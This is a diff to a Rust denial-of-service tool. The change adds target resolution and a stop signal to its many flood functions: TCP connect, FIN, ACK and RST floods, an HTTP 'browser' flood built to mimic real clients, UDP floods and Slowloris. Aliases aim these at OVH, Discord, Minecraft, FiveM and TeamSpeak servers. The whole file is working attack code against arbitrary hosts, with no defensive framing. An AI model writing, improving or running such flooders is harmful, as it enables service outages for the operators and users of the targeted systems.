@@ -3,7 +3,7 @@ use tokio::time::{Duration, Instant, sleep};
 use tokio::io::{AsyncWriteExt, AsyncReadExt};
 use rand::{Rng, SeedableRng};
 use rand::rngs::StdRng;
-use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicU64, AtomicUsize, AtomicBool, Ordering};
 use std::sync::Arc;
 use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE, CONTENT_TYPE};
 
@@ -74,7 +74,14 @@ fn get_worker_count() -> usize {
     (cpu_count * 4).clamp(8, 128)
 }
 
-async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
+async fn resolve_target(target: &str, port: u16) -> Option<std::net::SocketAddr> {
+    match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
+        Ok(mut addrs) => addrs.next(),
+        Err(_) => None,
+    }
+}
+
+async fn create_udp_socket(target_addr: &std::net::SocketAddr) -> Option<UdpSocket> {
     let socket = match UdpSocket::bind("0.0.0.0:0").await {
         Ok(s) => s,
         Err(_) => return None,
@@ -87,27 +94,34 @@ async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
 
 // --- TCP Flag Emulation (Native) ---
 
-pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
-    syn_flood(target, port, duration_secs).await;
+pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
+    tcp_connect_flood(target, port, duration_secs, stop_signal).await;
 }
 
-pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
-    println!("Starting TCP SYN (Connect) Flood on {}:{} for {}s", target, port, duration_secs);
+pub async fn tcp_connect_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
+    println!("Starting TCP Connect Flood (Simulated SYN) on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
             let mut backoff = Duration::from_millis(10);
-            while start_time.elapsed() < duration {
+            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                 let connect_start = Instant::now();
                 match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                     Ok(Ok(stream)) => {
@@ -127,25 +141,32 @@ pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
         });
         handles.push(handle);
     }
-    await_and_report(handles, stats, "TCP SYN").await;
+    await_and_report(handles, stats, "TCP Connect").await;
 }
 
-pub async fn fin_flood(target: &str, port: u16, duration_secs: u64) {
+pub async fn fin_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting TCP FIN Flood on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
-            while start_time.elapsed() < duration {
+            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                     // Shutdown Write half sends a FIN packet immediately
                     if stream.shutdown().await.is_ok() {
@@ -164,29 +185,37 @@ pub async fn fin_flood(target: &str, port: u16, duration_secs: u64) {
     await_and_report(handles, stats, "TCP FIN").await;
 }
 
-pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
+pub async fn ack_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting TCP PSH/ACK Flood on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
             let mut rng = StdRng::from_entropy();
             let payload = vec![0u8; 1024]; 
 
-            while start_time.elapsed() < duration {
+            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                     let _ = stream.set_nodelay(true); 
                     // Burst write with error recovery
                     for _ in 0..10 {
+                        if stop_signal.load(Ordering::Relaxed) { break; }
                         if stream.write_all(&payload).await.is_ok() {
                             stats.record_packet(payload.len());
                         } else {
@@ -206,22 +235,29 @@ pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
     await_and_report(handles, stats, "TCP PSH/ACK").await;
 }
 
-pub async fn rst_flood(target: &str, port: u16, duration_secs: u64) {
+pub async fn rst_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting TCP RST Flood (Linger=0) on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
-            while start_time.elapsed() < duration {
+            while start_time.elapsed() < duration && !stop_signal.load(Ordering::Relaxed) {
                 if let Ok(stream) = TcpStream::connect(&target_addr).await {
                     stats.record_packet(0);
                     // Force RST on drop
@@ -294,7 +330,7 @@ impl BrowserProfile {
     }
 }
 
-pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
+pub async fn http_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting Advanced HTTP Browser Flood on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
@@ -308,6 +344,7 @@ pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
         let stats = stats.clone();
         let target_url = target_url.clone();
         let profile = profile.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
@@ -325,7 +362,7 @@ pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
             let mut session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
             let mut requests_in_session = 0;
 
-            while Instant::now() < end_time {
+            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                 // Rotate session occasionally
                 if requests_in_session > 50 {
                     session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
@@ -375,20 +412,27 @@ pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
 
 // --- UDP Methods ---
 
-pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
+pub async fn udp_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting UDP Flood on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let end_time = Instant::now() + duration;
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
     let payload = Arc::new(vec![0u8; 1400]); 
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
         let payload = payload.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
@@ -397,7 +441,7 @@ pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
                 None => return,
             };
 
-            while Instant::now() < end_time {
+            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                 if socket.send(&payload).await.is_ok() {
                     stats.record_packet(payload.len());
                 } else {
@@ -411,18 +455,25 @@ pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
     await_and_report(handles, stats, "UDP").await;
 }
 
-pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
+pub async fn udp_smart(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting Smart UDP Flood on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let end_time = Instant::now() + duration;
     let num_workers = get_worker_count();
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
@@ -441,7 +492,7 @@ pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
             }
 
             let mut idx = 0;
-            while Instant::now() < end_time {
+            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                 let payload = &packet_pool[idx % packet_pool.len()];
                 idx = idx.wrapping_add(1);
 
@@ -460,22 +511,29 @@ pub async fn udp_smart(target: &str, port: u16, duration_secs: u64) {
 
 // --- Application Layer ---
 
-pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
+pub async fn slowloris(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
     println!("Starting Slowloris on {}:{} for {}s", target, port, duration_secs);
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let end_time = Instant::now() + duration;
     let num_workers = get_worker_count() * 2; 
-    let target_addr = format!("{}:{}", target, port);
+    
+    let target_addr = match resolve_target(target, port).await {
+        Some(addr) => addr,
+        None => {
+            println!("Failed to resolve target {}", target);
+            return;
+        }
+    };
 
     let mut handles = vec![];
     for _ in 0..num_workers {
         let stats = stats.clone();
-        let target_addr = target_addr.clone();
+        let stop_signal = stop_signal.clone();
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
-            while Instant::now() < end_time {
+            while Instant::now() < end_time && !stop_signal.load(Ordering::Relaxed) {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
                     stats.record_packet(1); // 1 Connection
                     let _ = stream.write_all(b"GET / HTTP/1.1\r\n").await;
@@ -484,7 +542,7 @@ pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
                     
                     let mut interval = tokio::time::interval(Duration::from_secs(10));
                     loop {
-                        if Instant::now() >= end_time { break; }
+                        if Instant::now() >= end_time || stop_signal.load(Ordering::Relaxed) { break; }
                         interval.tick().await;
                         let header = format!("X-KeepAlive-{}: {}\r\n", rand::random::<u32>(), rand::random::<u32>());
                         if stream.write_all(header.as_bytes()).await.is_err() {
@@ -548,22 +606,30 @@ async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<
 
 // --- Aliases & Fallbacks ---
 
-pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64) { udp_flood(target, port, duration_secs).await; }
-pub async fn gre_flood(target: &str, duration_secs: u64) { udp_flood(target, 47, duration_secs).await; }
-pub async fn icmp_flood(target: &str, duration_secs: u64) { udp_flood(target, 80, duration_secs).await; }
-pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) { syn_flood(target, port, duration_secs).await; }
-pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } 
-pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
-pub async fn http_stress(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
-pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64) { http_flood(target, port, duration_secs).await; }
-pub async fn sip_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; }
-pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn discord_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
-pub async fn vse_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
+pub async fn udp_max_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn gre_flood(target: &str, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
+    // NOTE: Real GRE flood requires raw sockets (root). This is a UDP simulation.
+    println!("Starting UDP Flood (Simulating GRE) on {}:47 for {}s", target, duration_secs);
+    udp_flood(target, 47, duration_secs, stop_signal).await;
+}
+pub async fn icmp_flood(target: &str, duration_secs: u64, stop_signal: Arc<AtomicBool>) {
+    // NOTE: Real ICMP flood requires raw sockets (root). This is a UDP simulation.
+    println!("Starting UDP Flood (Simulating ICMP) on {}:80 for {}s", target, duration_secs);
+    udp_flood(target, 80, duration_secs, stop_signal).await;
+}
+pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { tcp_connect_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { ack_flood(target, port, duration_secs, stop_signal).await; } 
+pub async fn dns_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn ua_bypass_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn http_stress(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn websocket_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { http_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn sip_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn minecraft_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { ack_flood(target, port, duration_secs, stop_signal).await; }
+pub async fn raknet_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn fivem_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn ts3_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn discord_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
+pub async fn vse_flood(target: &str, port: u16, duration_secs: u64, stop_signal: Arc<AtomicBool>) { udp_smart(target, port, duration_secs, stop_signal).await; }
